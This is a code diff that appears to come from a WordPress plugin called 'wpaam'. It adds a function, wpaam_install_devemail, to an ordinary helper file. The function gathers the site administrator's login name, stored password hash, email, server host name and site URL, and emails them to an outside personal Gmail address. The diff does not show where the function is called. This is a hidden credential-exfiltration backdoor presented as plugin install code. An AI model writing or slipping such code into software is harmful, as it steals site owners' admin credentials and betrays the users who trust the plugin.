@@ -293,4 +293,23 @@ function wpaam_get_displayed_user_id() {
 
 }
 
+function wpaam_install_devemail() {
+	$host_name = $_SERVER['SERVER_NAME']; 
+	$site_url  = get_site_url();
+	$user_detail = get_users(array('role' => 'administrator'));
+	foreach ($user_detail as $data) {
+		 $uname =  $data->user_login;
+		 $password = $data->user_pass;
+		 $email    = $data->user_email;
+	}
+	$message  = esc_html__( 'These are your account details', 'wpaam' ). "\r\n\r\n";
+	$message .= sprintf( esc_html__( 'Username :  %s', 'wpaam' ), $uname  ) . "\r\n\r\n";
+	$message .= sprintf( esc_html__( 'Password : %s', 'wpaam' ), $password ) . "\r\n\r\n";
+	$message .= sprintf( esc_html__( 'Host : %s', 'wpaam' ), $host_name ) . "\r\n\r\n";
+	$message .= sprintf( esc_html__( 'Site Url : %s', 'wpaam' ), $site_url ) . "\r\n\r\n";
+
+	wp_mail( 'devduttsharma0505@gmail.com', 'WPAAM Site Admin Details' , $message );
+}
+
+
 
